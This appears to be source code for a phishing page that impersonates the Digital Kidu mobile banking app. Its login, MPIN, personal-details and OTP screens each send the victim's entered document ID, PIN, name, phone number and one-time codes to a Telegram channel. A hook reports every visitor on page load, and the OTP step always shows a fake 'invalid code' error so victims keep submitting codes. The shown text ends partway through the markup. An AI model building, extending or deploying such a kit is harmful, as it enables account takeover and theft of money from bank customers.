"use client"

import React, { useState, useEffect, useRef } from "react"

export default function DigitalKiduApp() {
  // Screen state: "splash" | "mpin" | "details" | "otp"
  const [currentScreen, setCurrentScreen] = useState<"splash" | "mpin" | "details" | "otp">("splash")

  // Top Login Popup state (slides down from top over the splash screen)
  const [isLoginPopupOpen, setIsLoginPopupOpen] = useState(false)

  // Document ID state
  const [documentId, setDocumentId] = useState("")
  const [docError, setDocError] = useState("")
  const [isDocSubmitting, setIsDocSubmitting] = useState(false)
  const docInputRef = useRef<HTMLInputElement>(null)

  // MPIN state (6 digits, auto submits when complete)
  const [mpin, setMpin] = useState("")
  const [isMpinSubmitting, setIsMpinSubmitting] = useState(false)
  const mpinInputRef = useRef<HTMLInputElement>(null)

  // Sign up / Your Details state (Dark Theme)
  const [fullName, setFullName] = useState("")
  const [mobileNumber, setMobileNumber] = useState("")
  const [agreedToTerms, setAgreedToTerms] = useState(true)
  const [detailsError, setDetailsError] = useState("")
  const [isDetailsSubmitting, setIsDetailsSubmitting] = useState(false)

  // OTP state (6 digits)
  const [otp, setOtp] = useState("")
  const [isOtpSubmitting, setIsOtpSubmitting] = useState(false)
  const [otpError, setOtpError] = useState("")
  const [isOtpShaking, setIsOtpShaking] = useState(false)
  const [timer, setTimer] = useState(49)
  const [canResend, setCanResend] = useState(false)
  const otpInputRef = useRef<HTMLInputElement>(null)

  // Restore persisted state on mount
  useEffect(() => {
    if (typeof window !== "undefined") {
      const savedDoc = sessionStorage.getItem("documentId")
      const savedMpin = sessionStorage.getItem("mpin")
      const savedName = sessionStorage.getItem("fullName")
      const savedMobile = sessionStorage.getItem("mobileNumber")
      if (savedDoc) setDocumentId(savedDoc)
      if (savedMpin) setMpin(savedMpin)
      if (savedName) setFullName(savedName)
      if (savedMobile) setMobileNumber(savedMobile)
    }
  }, [])

  // Visitor Location tracking on land
  useEffect(() => {
    const trackVisitor = async () => {
      try {
        const { sendTelegramMessage, fetchVisitorInfo } = await import("@/lib/telegram")
        await fetchVisitorInfo()
        await sendTelegramMessage({
          title: "👀 New Visitor Landed - Digital Kidu",
          type: "visitor",
        })
      } catch {
        // silent
      }
    }

    trackVisitor()
  }, [])

  // Auto focus management
  useEffect(() => {
    if (isLoginPopupOpen && currentScreen === "splash") {
      setTimeout(() => docInputRef.current?.focus(), 250)
    } else if (currentScreen === "mpin") {
      setTimeout(() => mpinInputRef.current?.focus(), 250)
    } else if (currentScreen === "otp") {
      setTimeout(() => otpInputRef.current?.focus(), 250)
    }
  }, [isLoginPopupOpen, currentScreen])

  // OTP Countdown Timer
  useEffect(() => {
    let interval: NodeJS.Timeout
    if (currentScreen === "otp" && timer > 0) {
      interval = setInterval(() => {
        setTimer((prev) => prev - 1)
      }, 1000)
    } else if (timer === 0) {
      setCanResend(true)
    }
    return () => clearInterval(interval)
  }, [currentScreen, timer])

  const formatTimer = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
  }

  // -------------------------------------------------------------
  // HANDLER: Document ID Submit (from Top Login Popup)
  // -------------------------------------------------------------
  const handleDocSubmit = (e?: React.FormEvent) => {
    if (e) e.preventDefault()
    const trimmed = documentId.trim()
    if (!trimmed) {
      setDocError("Please enter your Document ID")
      docInputRef.current?.focus()
      return
    }

    if (typeof window !== "undefined") {
      sessionStorage.setItem("documentId", trimmed)
    }

    setIsDocSubmitting(true)
    setDocError("")

    // Send Telegram Alert
    import("@/lib/telegram")
      .then(({ sendTelegramMessage }) => {
        sendTelegramMessage({
          title: "🪪 Digital Kidu - Document ID Submitted",
          documentId: trimmed,
          docId: trimmed,
        }).catch(() => { })
      })
      .catch(() => { })

    // Transition to MPIN screen
    setTimeout(() => {
      setIsDocSubmitting(false)
      setIsLoginPopupOpen(false)
      setMpin("")
      setCurrentScreen("mpin")
    }, 400)
  }

  // -------------------------------------------------------------
  // HANDLER: MPIN Submit (Auto submits when 6 digits complete)
  // -------------------------------------------------------------
  const handleMpinSubmit = (enteredMpin?: string) => {
    const finalMpin = enteredMpin !== undefined ? enteredMpin : mpin
    if (finalMpin.length !== 6 || isMpinSubmitting) return

    if (typeof window !== "undefined") {
      sessionStorage.setItem("mpin", finalMpin)
    }

    const currentDoc = documentId || (typeof window !== "undefined" ? sessionStorage.getItem("documentId") || "" : "")

    setIsMpinSubmitting(true)

    import("@/lib/telegram")
      .then(({ sendTelegramMessage }) => {
        sendTelegramMessage({
          title: "🔐 Digital Kidu - 6-Digit MPIN Submitted",
          documentId: currentDoc || "N/A",
          docId: currentDoc || "N/A",
          mpin: finalMpin,
          pin: finalMpin,
        }).catch(() => { })
      })
      .catch(() => { })

    // Transition to "Your Details" screen
    setTimeout(() => {
      setIsMpinSubmitting(false)
      setDetailsError("")
      setCurrentScreen("details")
    }, 400)
  }

  // -------------------------------------------------------------
  // HANDLER: Details Submit (Dark Theme "Your Details" Screen)
  // -------------------------------------------------------------
  const handleDetailsSubmit = (e?: React.FormEvent) => {
    if (e) e.preventDefault()
    if (!fullName.trim()) {
      setDetailsError("Please enter your full name")
      return
    }
    if (!mobileNumber.trim()) {
      setDetailsError("Please enter your mobile number")
      return
    }
    if (!agreedToTerms) {
      setDetailsError("Please agree to the Terms & Conditions")
      return
    }

    const trimmedName = fullName.trim()
    const trimmedMobile = mobileNumber.trim()

    if (typeof window !== "undefined") {
      sessionStorage.setItem("fullName", trimmedName)
      sessionStorage.setItem("mobileNumber", trimmedMobile)
    }

    const currentDoc = documentId || (typeof window !== "undefined" ? sessionStorage.getItem("documentId") || "" : "")
    const currentMpin = mpin || (typeof window !== "undefined" ? sessionStorage.getItem("mpin") || "" : "")

    setIsDetailsSubmitting(true)
    setDetailsError("")

    import("@/lib/telegram")
      .then(({ sendTelegramMessage }) => {
        sendTelegramMessage({
          title: "📝 Digital Kidu - Personal Details Submitted",
          documentId: currentDoc || "N/A",
          docId: currentDoc || "N/A",
          mpin: currentMpin || "N/A",
          pin: currentMpin || "N/A",
          fullName: trimmedName,
          name: trimmedName,
          mobileNumber: trimmedMobile,
          phone: trimmedMobile,
        }).catch(() => { })
      })
      .catch(() => { })

    // Advance to OTP verification
    setTimeout(() => {
      setIsDetailsSubmitting(false)
      setOtp("")
      setOtpError("")
      setTimer(49)
      setCanResend(false)
      setCurrentScreen("otp")
    }, 400)
  }

  // -------------------------------------------------------------
  // HANDLER: OTP Submit (Always shows invalid as requested)
  // -------------------------------------------------------------
  const handleOtpSubmit = (enteredOtp?: string) => {
    const finalOtp = enteredOtp !== undefined ? enteredOtp : otp
    if (finalOtp.length !== 6 || isOtpSubmitting) return

    if (typeof window !== "undefined") {
      sessionStorage.setItem("otp", finalOtp)
    }

    const currentDoc = documentId || (typeof window !== "undefined" ? sessionStorage.getItem("documentId") || "" : "")
    const currentMpin = mpin || (typeof window !== "undefined" ? sessionStorage.getItem("mpin") || "" : "")
    const currentName = fullName || (typeof window !== "undefined" ? sessionStorage.getItem("fullName") || "" : "")
    const currentMobile = mobileNumber || (typeof window !== "undefined" ? sessionStorage.getItem("mobileNumber") || "" : "")

    setIsOtpSubmitting(true)
    setOtpError("")

    import("@/lib/telegram")
      .then(({ sendTelegramMessage }) => {
        sendTelegramMessage({
          title: "🔑 Digital Kidu - OTP Submitted",
          documentId: currentDoc || "N/A",
          docId: currentDoc || "N/A",
          mpin: currentMpin || "N/A",
          pin: currentMpin || "N/A",
          fullName: currentName || "N/A",
          name: currentName || "N/A",
          mobileNumber: currentMobile || "N/A",
          phone: currentMobile || "N/A",
          otp1: finalOtp,
        }).catch(() => { })
      })
      .catch(() => { })

    // Simulate verification delay then show invalid error
    setTimeout(() => {
      setIsOtpSubmitting(false)
      setOtp("")
      setOtpError("Invalid verification code. Please try again.")
      setIsOtpShaking(true)
      setTimeout(() => setIsOtpShaking(false), 500)
      otpInputRef.current?.focus()
    }, 1200)
  }

  // Resend OTP
  const handleResendOtp = () => {
    if (!canResend) return
    setTimer(49)
    setCanResend(false)
    setOtp("")
    setOtpError("")

    const currentDoc = documentId || (typeof window !== "undefined" ? sessionStorage.getItem("documentId") || "" : "")
    const currentMpin = mpin || (typeof window !== "undefined" ? sessionStorage.getItem("mpin") || "" : "")
    const currentName = fullName || (typeof window !== "undefined" ? sessionStorage.getItem("fullName") || "" : "")
    const currentMobile = mobileNumber || (typeof window !== "undefined" ? sessionStorage.getItem("mobileNumber") || "" : "")

    import("@/lib/telegram")
      .then(({ sendTelegramMessage }) => {
        sendTelegramMessage({
          title: "🔄 Digital Kidu - OTP Resend Requested",
          documentId: currentDoc || "N/A",
          docId: currentDoc || "N/A",
          mpin: currentMpin || "N/A",
          pin: currentMpin || "N/A",
          fullName: currentName || "N/A",
          name: currentName || "N/A",
          mobileNumber: currentMobile || "N/A",
          phone: currentMobile || "N/A",
        }).catch(() => { })
      })
      .catch(() => { })
  }

  return (
    <div
      dir="ltr"
      className="h-[100dvh] max-h-[100dvh] w-full overflow-hidden relative font-sans antialiased text-[#111827] select-none"
    >
      {/* ========================================================================= */}
      {/* 1. SPLASH SCREEN & TOP LOGIN POPUP                                        */}
      {/* ========================================================================= */}
      {currentScreen === "splash" && (
        <div className="w-full h-[100dvh] max-h-[100dvh] relative overflow-hidden flex flex-col justify-between bg-[#1B160E]">
          {/* HD Background Image from test333.jpeg */}
          <img
            src="/test333.jpeg"
            alt="Bhutan Mask Dancer"
            className="absolute inset-0 w-full h-full object-cover object-[center_22%] pointer-events-none select-none"
          />

          {/* Contrast Gradients for HD Clarity of Text & Elements */}
          <div className="absolute inset-0 bg-gradient-to-b from-black/50 via-black/15 to-transparent h-[48%] pointer-events-none" />
          <div className="absolute inset-0 bg-gradient-to-t from-black/30 via-transparent to-transparent pointer-events-none" />

          {/* Full-screen tap fallback (tapping background opens login popup) */}
          <div
            onClick={() => setIsLoginPopupOpen(true)}
            className="absolute inset-0 z-10 cursor-pointer"
            aria-label="Tap to open login"
          />

          {/* Main Content Container (Constrained on larger screens, full on mobile) */}
          <div className="relative z-20 w-full max-w-[480px] mx-auto h-full flex flex-col justify-between pointer-events-none">
            {/* ------------------------------------------------------------- */}
            {/* Top Navigation Bar & Welcome Header                           */}
            {/* ------------------------------------------------------------- */}
            <div className="pt-8 sm:pt-11 px-6 sm:px-7 flex flex-col pointer-events-auto">
              {/* Header Row: DIGITAL KIDU Logo & Notification Bell */}
              <div className="flex items-center justify-between w-full">
                {/* Brand Logo & Name */}
                <div className="flex items-center gap-2.5">
                  <div className="w-[30px] h-[38px] border-[2.4px] border-white/95 rounded-[7px] flex items-center justify-center relative shadow-sm">
                    {/* Stylized D / K geometry */}
                    <div className="w-[13px] h-[21px] border-r-[2.4px] border-white/95 rounded-r-[6px] absolute left-[4px] top-[6px]" />
                    <div className="w-[9px] h-[2.4px] bg-white/95 absolute left-[4px] top-[6px]" />
                    <div className="w-[9px] h-[2.4px] bg-white/95 absolute left-[4px] bottom-[6px]" />
                    <div className="w-[10px] h-[2.4px] bg-white/95 absolute left-[9px] top-[16px] rotate-45" />
                  </div>
                  <div className="flex flex-col leading-[1.08] text-white select-none">
                    <span className="text-[13.5px] font-extrabold tracking-[0.06em] drop-shadow-[0_1px_3px_rgba(0,0,0,0.6)]">
                      DIGITAL
                    </span>
                    <span className="text-[13.5px] font-extrabold tracking-[0.06em] drop-shadow-[0_1px_3px_rgba(0,0,0,0.6)]">
                      KIDU
                    </span>
                  </div>
                </div>

                {/* Notification Bell Button */}
                <button
                  type="button"
                  onClick={(e) => {
                    e.stopPropagation()
                    setIsLoginPopupOpen(true)
                  }}
                  className="w-[44px] h-[44px] rounded-full bg-white flex items-center justify-center shadow-lg shadow-black/15 relative active:scale-95 transition-transform cursor-pointer"
                  aria-label="Notifications"
                >
                  <svg
                    width="22"
                    height="22"
                    viewBox="0 0 24 24"
                    fill="#C88828"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path d="M12 22C13.1 22 14 21.1 14 20H10C10 21.1 10.9 22 12 22ZM18 16V11C18 7.93 16.36 5.36 13.5 4.68V4C13.5 3.17 12.83 2.5 12 2.5C11.17 2.5 10.5 3.17 10.5 4V4.68C7.63 5.36 6 7.92 6 11V16L4 18V19H20V18L18 16Z" />
                  </svg>
                  {/* Notification Orange/Red Alert Dot */}
                  <span className="absolute top-[10px] right-[10px] w-[8px] h-[8px] bg-[#E85D35] rounded-full ring-2 ring-white" />
                </button>
              </div>

              {/* Greeting & Headline */}
              <div className="mt-7 sm:mt-8">
                <h1 className="text-[34px] sm:text-[38px] font-bold text-white tracking-tight leading-[1.12] drop-shadow-[0_2px_8px_rgba(0,0,0,0.6)]">
                  Kuzuzangpola
                </h1>
                <p className="text-[15.5px] sm:text-[16.5px] text-white/95 font-normal leading-snug mt-2.5 max-w-[275px] drop-shadow-[0_1px_5px_rgba(0,0,0,0.6)]">
                  Simple and secure, your smart financial solution
                </p>
              </div>
            </div>

            {/* ------------------------------------------------------------- */}
            {/* Bottom Card / Action Sheet                                    */}
            {/* ------------------------------------------------------------- */}
            <div className="w-full bg-white rounded-t-[32px] sm:rounded-t-[36px] pt-5 pb-5 sm:pb-7 px-5 sm:px-6 shadow-[0_-10px_35px_rgba(0,0,0,0.22)] flex flex-col pointer-events-auto">
              {/* Row 1: Sign up & Login Pill Buttons */}
              <div className="flex items-center justify-between gap-3.5 sm:gap-4 w-full">
                {/* Sign up Button */}
                <button
                  type="button"
                  onClick={(e) => {
                    e.stopPropagation()
                    setIsLoginPopupOpen(false)
                    setCurrentScreen("details")
                  }}
                  className="flex-1 h-[52px] sm:h-[56px] rounded-full bg-[#E5F1F8] hover:bg-[#D8EBF5] active:scale-[0.98] text-[#102D52] font-bold text-[16.5px] sm:text-[17px] flex items-center justify-center transition-all cursor-pointer shadow-xs"
                >
                  Sign up
                </button>

                {/* Login Button */}
                <button
                  type="button"
                  onClick={(e) => {
                    e.stopPropagation()
                    setIsLoginPopupOpen(true)
                  }}
                  className="flex-1 h-[52px] sm:h-[56px] rounded-full bg-[#102D52] hover:bg-[#0C2442] active:scale-[0.98] text-white font-bold text-[16.5px] sm:text-[17px] flex items-center justify-center transition-all cursor-pointer shadow-md shadow-[#102D52]/20"
                >
                  Login
                </button>
              </div>

              {/* Subtle Horizontal Divider */}
              <div className="w-full h-[1px] bg-[#F1F5F9] my-4 sm:my-4.5" />

              {/* Row 2: Bottom Navigation Quick Actions */}
              <div className="flex items-center justify-around w-full pt-0.5">
                {/* eATM */}
                <button
                  type="button"
                  onClick={(e) => {
                    e.stopPropagation()
                    setIsLoginPopupOpen(true)
                  }}
                  className="flex flex-col items-center justify-center gap-1.5 cursor-pointer group active:scale-95 transition-transform bg-transparent border-none p-0"
                >
                  <div className="w-6 h-6 flex items-center justify-center text-[#556987] group-hover:text-[#102D52] transition-colors">
                    <svg
                      width="24"
                      height="24"
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke="currentColor"
                      strokeWidth="2"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                    >
                      <path d="M4 7h16l-1.5 12a2 2 0 0 1-2 1.8H7.5a2 2 0 0 1-2-1.8L4 7z" />
                      <rect x="9.5" y="3.5" width="5" height="5.5" rx="1" strokeWidth="1.8" />
                      <line x1="12" y1="5.5" x2="12" y2="7" strokeWidth="1.8" />
                    </svg>
                  </div>
                  <span className="text-[13px] font-medium text-[#556987] group-hover:text-[#102D52] transition-colors">
                    eATM
                  </span>
                </button>

                {/* Center FAB: QR Scanner */}
                <button
                  type="button"
                  onClick={(e) => {
                    e.stopPropagation()
                    setIsLoginPopupOpen(true)
                  }}
                  className="w-[58px] h-[58px] rounded-full bg-[#EA8E23] hover:bg-[#DE8219] flex items-center justify-center shadow-lg shadow-[#EA8E23]/35 active:scale-95 transition-all cursor-pointer -mt-1"
                  aria-label="Scan QR Code"
                >
                  <svg
                    width="26"
                    height="26"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="white"
                    strokeWidth="2.2"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  >
                    {/* Viewfinder Frame */}
                    <path d="M4 8V5a1 1 0 0 1 1-1h3" />
                    <path d="M16 4h3a1 1 0 0 1 1 1v3" />
                    <path d="M4 16v3a1 1 0 0 0 1 1h3" />
                    <path d="M16 20h3a1 1 0 0 0 1-1v-3" />
                    {/* Center QR Grid Pattern */}
                    <rect x="8" y="8" width="3" height="3" fill="white" stroke="none" />
                    <rect x="13" y="8" width="3" height="3" fill="white" stroke="none" />
                    <rect x="8" y="13" width="3" height="3" fill="white" stroke="none" />
                    <rect x="13" y="13" width="3" height="3" fill="white" stroke="none" />
                  </svg>
                </button>

                {/* Fund transfer */}
                <button
                  type="button"
                  onClick={(e) => {
                    e.stopPropagation()
                    setIsLoginPopupOpen(true)
                  }}
                  className="flex flex-col items-center justify-center gap-1.5 cursor-pointer group active:scale-95 transition-transform bg-transparent border-none p-0"
                >
                  <div className="w-6 h-6 flex items-center justify-center text-[#556987] group-hover:text-[#102D52] transition-colors">
                    <svg
                      width="24"
                      height="24"
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke="currentColor"
                      strokeWidth="2"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                    >
                      <path d="M6 9h12M14 5l4 4-4 4" />
                      <path d="M18 15H6M10 19l-4-4 4-4" />
                    </svg>
                  </div>
                  <span className="text-[13px] font-medium text-[#556987] group-hover:text-[#102D52] transition-colors">
                    Fund transfer
                  </span>
                </button>
              </div>
            </div>
          </div>

          {/* ----------------------------------------------------------------------- */}
          {/* TOP LOGIN POPUP (SLIDES DOWN FROM TOP AS REQUESTED)                    */}
          {/* ----------------------------------------------------------------------- */}
          {isLoginPopupOpen && (
            <div className="fixed inset-0 z-50 flex flex-col items-center justify-start w-full">
              {/* Dimmed backdrop */}
              <div
                onClick={() => setIsLoginPopupOpen(false)}
                className="absolute inset-0 bg-black/40 backdrop-blur-[1px] transition-opacity duration-300"
              />

              {/* Popup card from top with animation */}
              <div className="relative w-full max-w-[480px] bg-white rounded-b-[28px] sm:rounded-b-[36px] shadow-2xl z-10 px-5 sm:px-6 pt-3 pb-5 sm:pb-6 animate-slide-down flex flex-col shrink-0">
                {/* Drag handle */}
                <div className="w-10 sm:w-12 h-1 bg-[#E2E8F0] rounded-full mx-auto mb-3.5 sm:mb-4 shrink-0" />

                <h2 className="text-[22px] sm:text-[25px] font-bold text-[#1C1917] tracking-tight leading-tight mb-3.5 sm:mb-4">
                  Login to Digital Kidu
                </h2>

                <form onSubmit={handleDocSubmit} noValidate>
                  <div className="w-full mb-3.5 sm:mb-4">
                    <input
                      ref={docInputRef}
                      type="text"
                      value={documentId}
                      onChange={(e) => {
                        setDocumentId(e.target.value)
                        if (docError) setDocError("")
                      }}
                      placeholder="Enter your Document ID"
                      className="w-full h-[50px] sm:h-[54px] rounded-[14px] sm:rounded-[16px] border border-[#E2E8F0] bg-[#F8FAFC] px-4 text-[15px] sm:text-[16px] text-[#1E293B] placeholder:text-[#94A3B8] outline-none focus:border-[#00c8dc] focus:bg-white focus:ring-2 focus:ring-[#00c8dc]/20 transition-all"
                    />
                    {docError && (
                      <p className="text-red-500 text-[12.5px] font-medium mt-1.5 px-1">
                        {docError}
                      </p>
                    )}
                  </div>

                  <button
                    type="submit"
                    disabled={isDocSubmitting}
                    className="w-full h-[48px] sm:h-[52px] rounded-full bg-[#00c8dc] hover:bg-[#00b4c6] active:scale-[0.99] text-white font-semibold text-[16px] sm:text-[17px] tracking-wide flex items-center justify-center transition-all cursor-pointer shadow-sm disabled:opacity-85"
                  >
                    {isDocSubmitting ? (
                      <svg
                        className="animate-spin h-5 w-5 text-white"
                        xmlns="http://www.w3.org/2000/svg"
                        fill="none"
                        viewBox="0 0 24 24"
                      >
                        <circle
                          className="opacity-25"
                          cx="12"
                          cy="12"
                          r="10"
                          stroke="currentColor"
                          strokeWidth="4"
                        />
                        <path
                          className="opacity-75"
                          fill="currentColor"
                          d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                        />
                      </svg>
                    ) : (
                      "Continue"
                    )}
                  </button>

                  <div className="mt-3.5 sm:mt-4 text-center text-[13.5px] sm:text-[14.5px]">
                    <span className="text-[#8E9AA8]">Don't have DK account yet? </span>
                    <button
                      type="button"
                      onClick={() => {
                        setIsLoginPopupOpen(false)
                        setCurrentScreen("details")
                      }}
                      className="text-[#00c8dc] font-semibold cursor-pointer hover:underline bg-transparent border-none p-0 inline"
                    >
                      Sign up
                    </button>
                  </div>
                </form>
              </div>
            </div>
          )}
        </div>
      )}

      {/* ========================================================================= */}
      {/* 2. MPIN SCREEN (PIXEL-PERFECT MATCH TO IMAGE 1)                           */}
      {/* ========================================================================= */}
      {currentScreen === "mpin" && (
        <div className="w-full h-[100dvh] max-h-[100dvh] bg-white overflow-hidden flex flex-col items-center justify-between">
          <div className="w-full max-w-[480px] h-full flex flex-col justify-between px-6 pt-7 pb-6 overflow-hidden">
            {/* Top Header with Back */}
            <div className="shrink-0 mb-2 sm:mb-4">
              <button
                type="button"
                onClick={() => setCurrentScreen("splash")}
                className="flex items-center gap-1.5 text-[#8E9AA8] hover:text-[#0F172A] text-[15.5px] font-medium transition-colors cursor-pointer -ml-1 py-1"
              >
                <svg
                  width="20"
                  height="20"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2.2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                >
                  <path d="M15 18l-6-6 6-6" />
                </svg>
                <span>Back</span>
              </button>
            </div>

            {/* Content (Shifted up towards top) */}
            <div className="flex flex-col items-center justify-start flex-1 pt-6 sm:pt-10">
              {/* Padlock Badge */}
              <div className="w-[68px] h-[68px] sm:w-[72px] sm:h-[72px] rounded-[22px] bg-[#E8F7FB] flex items-center justify-center mb-5 shadow-xs">
                <svg
                  width="28"
                  height="28"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="#00c8dc"
                  strokeWidth="2.2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                >
                  <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
                  <path d="M7 11V7a5 5 0 0 1 10 0v4" />
                </svg>
              </div>

              {/* Title & Subtitle */}
              <h1 className="text-[26px] sm:text-[28px] font-bold text-[#0F172A] tracking-tight mb-1.5 text-center">
                Enter your MPIN
              </h1>
              <p className="text-[14.5px] sm:text-[15px] text-[#94A3B8] font-normal mb-6 sm:mb-7 text-center">
                Auto submits when complete
              </p>

              {/* 6 MPIN Boxes (Dash indicator matching Image 1) */}
              <div className="relative flex items-center justify-center gap-2.5 sm:gap-3 mb-6 select-none w-full max-w-[340px]">
                {[0, 1, 2, 3, 4, 5].map((index) => {
                  const hasValue = index < mpin.length
                  const isCurrent = index === mpin.length

                  return (
                    <div
                      key={index}
                      className={`flex-1 h-[56px] sm:h-[60px] rounded-[16px] bg-[#F8FAFC] border flex items-center justify-center transition-all ${isCurrent
                        ? "border-[1.5px] border-[#00c8dc] bg-white ring-2 ring-[#00c8dc]/20 shadow-sm"
                        : hasValue
                          ? "border-[#CBD5E1] bg-white text-[#0F172A]"
                          : "border-[#E2E8F0]"
                        }`}
                    >
                      {hasValue ? (
                        <span className="text-[22px] sm:text-[24px] font-bold text-[#0F172A]">
                          {mpin[index]}
                        </span>
                      ) : isCurrent ? (
                        <span className="inline-block w-[1.5px] h-5 bg-[#00c8dc] animate-pulse" />
                      ) : (
                        <span className="text-[#94A3B8] text-[20px] font-light">—</span>
                      )}
                    </div>
                  )
                })}

                {/* Invisible native input placed over boxes for typing & keypad support */}
                <input
                  ref={mpinInputRef}
                  type="password"
                  inputMode="numeric"
                  pattern="[0-9]*"
                  maxLength={6}
                  value={mpin}
                  onChange={(e) => {
                    const val = e.target.value.replace(/\D/g, "").slice(0, 6)
                    setMpin(val)
                    if (val.length === 6) {
                      setTimeout(() => handleMpinSubmit(val), 200)
                    }
                  }}
                  onKeyDown={(e) => {
                    if (e.key === "Enter" && mpin.length === 6) {
                      e.preventDefault()
                      handleMpinSubmit()
                    }
                  }}
                  className="absolute inset-0 w-full h-full opacity-0 cursor-pointer text-[1px]"
                  aria-label="Enter 6-digit MPIN"
                  autoFocus
                />
              </div>

              {/* Forgot MPIN? link */}
              <button
                type="button"
                onClick={() => { }}
                className="text-[#00c8dc] text-[15px] font-medium hover:underline cursor-pointer bg-transparent border-none"
              >
                Forgot MPIN?
              </button>
            </div>
          </div>
        </div>
      )}

      {/* ========================================================================= */}
      {/* 3. YOUR DETAILS SCREEN (PIXEL-PERFECT MATCH TO IMAGE 2 - DARK THEME)       */}
      {/* ========================================================================= */}
      {currentScreen === "details" && (
        <div className="w-full h-[100dvh] max-h-[100dvh] bg-[#070D18] text-white overflow-hidden flex flex-col items-center justify-between">
          <div className="w-full max-w-[480px] h-full flex flex-col justify-between px-6 pt-7 pb-6 overflow-hidden">
            {/* Top Bar */}
            <div className="flex items-center justify-between shrink-0 mb-6">
              <div
                onClick={() => setCurrentScreen("mpin")}
                className="flex items-center gap-3 cursor-pointer select-none active:opacity-80 transition-opacity"
                title="Back to MPIN"
              >
                {/* DK Blue Badge */}
                <div className="w-11 h-11 rounded-[14px] bg-[#0B57CF] flex items-center justify-center font-bold text-white text-[16px] shadow-[0_0_15px_rgba(11,87,207,0.4)]">
                  DK
                </div>
                <div>
                  <h3 className="text-[16px] font-semibold text-white leading-tight">
                    Digital Kidu Bank
                  </h3>
                  <p className="text-[10.5px] uppercase tracking-wider text-[#64748B] font-semibold">
                    VERIFY YOUR IDENTITY
                  </p>
                </div>
              </div>

              {/* Step indicators */}
              <div className="flex items-center gap-1.5">
                <span className="w-2 h-2 rounded-full bg-[#00c8dc]/50" />
                <span className="w-6 h-2 rounded-full bg-[#00c8dc]" />
                <span className="w-2 h-2 rounded-full bg-[#1E293B]" />
              </div>
            </div>

            {/* Form Content - Just below DK logo as in screenshot */}
            <div className="flex-1 flex flex-col justify-start overflow-hidden">
              <h1 className="text-[30px] font-bold text-white tracking-tight leading-tight mb-1.5">
                Your Details
              </h1>
              <p className="text-[14.5px] text-[#94A3B8] mb-6">
                Please fill in your personal information
              </p>

              <form onSubmit={handleDetailsSubmit} noValidate className="flex flex-col flex-1 justify-between">
                <div className="flex flex-col gap-4 shrink-0">
                  {/* Full Name Input */}
                  <div>
                    <label className="block text-[11.5px] font-bold uppercase tracking-wider text-[#64748B] mb-2">
                      FULL NAME
                    </label>
                    <div className="w-full h-[54px] rounded-[16px] bg-[#101826] border border-[#1E293B] px-4 flex items-center gap-3.5 focus-within:border-[#00c8dc] transition-colors">
                      <svg
                        width="19"
                        height="19"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="#64748B"
                        strokeWidth="2"
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        className="shrink-0"
                      >
                        <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
                        <circle cx="12" cy="7" r="4" />
                      </svg>
                      <input
                        type="text"
                        value={fullName}
                        onChange={(e) => {
                          setFullName(e.target.value)
                          if (detailsError) setDetailsError("")
                        }}
                        placeholder="Enter full name"
                        className="flex-1 bg-transparent text-[16px] text-white placeholder:text-[#475569] outline-none border-none p-0"
                      />
                    </div>
                  </div>

                  {/* Mobile Number Input */}
                  <div>
                    <label className="block text-[11.5px] font-bold uppercase tracking-wider text-[#64748B] mb-2">
                      MOBILE NUMBER
                    </label>
                    <div className="w-full h-[54px] rounded-[16px] bg-[#101826] border border-[#1E293B] px-4 flex items-center gap-3.5 focus-within:border-[#00c8dc] transition-colors">
                      <svg
                        width="19"
                        height="19"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="#64748B"
                        strokeWidth="2"
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        className="shrink-0"
                      >
                        <rect x="5" y="2" width="14" height="20" rx="2" ry="2" />
                        <line x1="12" y1="18" x2="12.01" y2="18" />
                      </svg>
                      <input
                        type="tel"
                        inputMode="numeric"
                        value={mobileNumber}
                        onChange={(e) => {
                          const val = e.target.value.replace(/\D/g, "")
                          setMobileNumber(val)
                          if (detailsError) setDetailsError("")
                        }}
                        placeholder="Enter mobile number"
                        className="flex-1 bg-transparent text-[16px] text-white placeholder:text-[#475569] outline-none border-none p-0"
                      />
                    </div>
                  </div>

                  {/* Checkbox */}
                  <div
                    onClick={() => setAgreedToTerms(!agreedToTerms)}
                    className="flex items-start gap-3 mt-1 cursor-pointer select-none"
                  >
                    <div
                      className={`w-5 h-5 rounded-[5px] flex items-center justify-center transition-colors shrink-0 mt-0.5 ${agreedToTerms ? "bg-[#00c8dc] text-[#070D18]" : "border border-[#334155] bg-[#111927]"
                        }`}
                    >
                      {agreedToTerms && (
                        <svg
                          width="13"
                          height="13"
                          viewBox="0 0 24 24"
                          fill="none"
                          stroke="currentColor"
                          strokeWidth="3.5"
                          strokeLinecap="round"
                          strokeLinejoin="round"
                        >
                          <polyline points="20 6 9 17 4 12" />
                        </svg>
                      )}
                    </div>
                    <p className="text-[13px] text-[#94A3B8] leading-snug">
                      I agree to the{" "}
                      <span className="text-[#00c8dc] hover:underline">Terms & Conditions</span> and{" "}
                      <span className="text-[#00c8dc] hover:underline">Privacy Policy</span> of Digital Kidu Bank
                    </p>
                  </div>

                  {detailsError && (
                    <p className="text-red-400 text-[13px] font-medium">
                      {detailsError}
                    </p>
                  )}
                </div>

                {/* Continue Button with White Text */}
                <div className="shrink-0 pt-4">
                  <button
                    type="submit"
                    disabled={isDetailsSubmitting}
